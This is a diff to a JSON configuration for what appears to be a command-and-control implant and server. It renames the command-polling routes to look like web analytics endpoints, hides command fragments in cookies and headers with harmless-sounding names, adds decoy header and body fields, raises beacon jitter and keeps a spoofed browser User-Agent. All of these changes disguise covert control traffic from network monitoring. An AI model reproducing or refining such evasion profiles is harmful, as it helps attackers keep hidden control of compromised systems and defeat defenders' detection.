@@ -1,29 +1,35 @@
 {
   "client": {
     "api_url": "http://localhost:8000",
-    "jitter_min": 3,
-    "jitter_max": 7,
-    "next_command_route": "/commands/next",
-    "command_response_route": "/commands/",
+    "jitter_min": 10,
+    "jitter_max": 15,
+    "next_command_route": "/v1/analytics/batch",
+    "command_response_route": "/v1/collect/i",
     "headers": {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
       "Accept": "text/html,application/xhtml+xml",
       "Accept-Encoding": "gzip, deflate"
     },
     "serializer": "hex",
-    "chunk_size": 8,
+    "chunk_size": 2,
     "fragments": [
-      {"index": 0, "location": "body", "field": "frag_0"},
-      {"index": 1, "location": "body", "field": "frag_1"}
+      {"index": 0, "location": "cookie", "field": "seed"},
+      {"index": 1, "location": "cookie", "field": "__uiddid"},
+      {"index": 2, "location": "body", "field": "token"},
+      {"index": 3, "location": "cookie", "field": "__cls"}
     ],
     "garbages": [
-      {"location": "body", "field": "stream_metadata", "garbage_type": "json_data"},
+      {"location": "body", "field": "metadata", "garbage_type": "json_data"},
       {"location": "header", "field": "X-Stream-Type", "garbage_type": "stream_header"},
-      {"location": "header", "field": "X-Timestamp", "garbage_type": "timestamp"}
+      {"location": "header", "field": "X-Timestamp", "garbage_type": "timestamp"},
+      {"location": "body", "field": "request_data", "garbage_type": "json_data"},
+      {"location": "header", "field": "X-Request-ID", "garbage_type": "uuid"},
+      {"location": "header", "field": "X-API-Version", "garbage_type": "random_string"},
+      {"location": "cookie", "field": "session_token", "garbage_type": "hex_data"}
     ],
     "command_id": {
       "location": "body",
-      "field": "csrf_token"
+      "field": "id_stats"
     }
   },
 
@@ -36,17 +42,23 @@
     "serializer": "base64",
     "chunk_size": 4,
     "fragments": [
-      {"index": 0, "location": "body", "field": "data_0"},
-      {"index": 1, "location": "body", "field": "data_1"}
+      {"index": 0, "location": "body", "field": "JSONID"},
+      {"index": 1, "location": "header", "field": "x-api-key"},
+      {"index": 2, "location": "header", "field": "if-none-match"},
+      {"index": 3, "location": "body", "field": "_stats"}
     ],
     "garbages": [
-      {"location": "body", "field": "metadata", "garbage_type": "json_data"},
-      {"location": "header", "field": "X-Response-Type", "garbage_type": "stream_header"},
-      {"location": "header", "field": "X-Response-Time", "garbage_type": "timestamp"}
+      {"location": "body", "field": "stream_metadata", "garbage_type": "json_data"},
+      {"location": "header", "field": "x-response-type", "garbage_type": "stream_header"},
+      {"location": "header", "field": "x-response-time", "garbage_type": "timestamp"},
+      {"location": "body", "field": "response_data", "garbage_type": "json_data"},
+      {"location": "header", "field": "x-response-id", "garbage_type": "uuid"},
+      {"location": "header", "field": "x-server-version", "garbage_type": "random_string"},
+      {"location": "cookie", "field": "server_token", "garbage_type": "hex_data"}
     ],
     "command_id": {
       "location": "body",
-      "field": "csrf_token"
+      "field": "id_stats"
     }
   }
 }
